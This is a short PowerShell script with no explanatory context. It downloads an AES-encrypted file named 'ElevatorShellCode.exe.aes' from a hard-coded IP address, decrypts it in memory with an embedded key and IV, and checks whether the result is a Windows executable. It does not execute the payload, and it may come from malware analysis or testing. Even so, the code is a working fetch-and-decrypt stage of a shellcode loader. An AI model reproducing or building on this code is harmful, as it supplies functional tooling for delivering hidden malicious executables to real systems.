$enc=(New-Object Net.WebClient).DownloadData('https://193.26.115.196/raw/ElevatorShellCode.exe.aes')
$k=[Convert]::FromBase64String('8XuttOXcFiQT+aOlVxneccVpq3mAugc5b7D3caLIVkbiFegb1/cCA2RAyIhtQult')
Write-Host "Encrypted: $($enc.Length) bytes"
Write-Host "Key decoded: $($k.Length) bytes"

$aes=New-Object System.Security.Cryptography.AesCryptoServiceProvider
$aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
$aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key=$k[0..31]
$aes.IV=$k[32..47]

$dec=$aes.CreateDecryptor()
$ms=New-Object System.IO.MemoryStream(,$enc)
$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$dec,[System.Security.Cryptography.CryptoStreamMode]::Read)
$out=New-Object System.IO.MemoryStream
try {
    $cs.CopyTo($out)
    $r=$out.ToArray()
    Write-Host "Decrypted: $($r.Length) bytes"
    if ($r.Length -gt 3) {
        Write-Host "First 4 bytes: $([BitConverter]::ToString($r[0..3]))"
        Write-Host "Is MZ PE? $($r[0] -eq 0x4D -and $r[1] -eq 0x5A)"
    }
} catch {
    Write-Host "DECRYPT ERROR: $_"
} finally {
    $out.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()
}
